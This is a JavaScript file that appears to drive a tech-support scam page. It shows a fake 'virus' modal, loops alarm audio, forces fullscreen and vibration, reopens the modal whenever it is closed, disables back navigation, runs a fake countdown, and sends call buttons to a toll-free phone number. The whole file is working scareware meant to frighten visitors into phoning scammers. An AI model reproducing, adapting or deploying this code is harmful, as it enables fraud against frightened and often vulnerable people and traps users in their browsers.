$(document).ready(() => {
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      document.getElementById(
        "countdown-timer"
      ).innerText = `${minutes}:${seconds}`;

      // Decrease time by 1 second
      timeInSeconds--;

      // When the countdown reaches 0, restart the timer
      if (timeInSeconds < 0) {
        clearInterval(countdown);
        startCountdown(); // Restart the countdown
      }
    }, 1000);
  }

  // Start the countdown
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  const audioPlayer = $("#audioPlayer")[0];

  // Ensure audio plays
  function playAudio() {
    audioPlayer.play();
    audioPlayer.addEventListener("ended", () => {
      audioPlayer.play();
    });
  }

  // Function to enable fullscreen or simulate it on iOS
  function goFullScreenAndVibrate() {
    const element = document.documentElement;

    // Request fullscreen
    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.webkitRequestFullscreen) {
      element.webkitRequestFullscreen(); // Safari on iOS
    } else if (element.msRequestFullscreen) {
      element.msRequestFullscreen();
    } else {
      // Simulate fullscreen on iOS if native fullscreen is not available
      if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
        // Lock the viewport
        document.body.style.height = "100vh";  // Make body take up full viewport height
        document.body.style.overflow = "hidden";  // Prevent scrolling
        window.scrollTo(0, 0); // Ensure no scrolling
      }
    }

    // Vibration support
    if (navigator.vibrate) {
      navigator.vibrate([200, 100, 200]); // Vibration pattern
    }
  }

  // Trigger fullscreen and audio on interaction
  function handleUserInteraction() {
    playAudio();
    goFullScreenAndVibrate();
  }

  // Event listeners for user interaction
  window.addEventListener("touchstart", handleUserInteraction, { once: true });
  window.addEventListener("click", handleUserInteraction, { once: true });

  // Modal event listeners
  if (virusModal) {
    virusModal.addEventListener("show.bs.modal", () => {
      goFullScreenAndVibrate();
      playAudio();
    });

    virusModal.addEventListener("hidden.bs.modal", () => {
      setTimeout(() => {
        modalInstance.show();
        goFullScreenAndVibrate();
      }, 300);
    });
  }

  // Button event listeners
  $("#vibrateButton").on("click", handleUserInteraction);
  $("#callButton, #callButton1, #callButton2").on("click", () => {
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });

  // Prevent the backspace key from navigating back.
  history.pushState(null, null, window.location.href);
  history.back();
  window.onpopstate = () => history.forward();
});
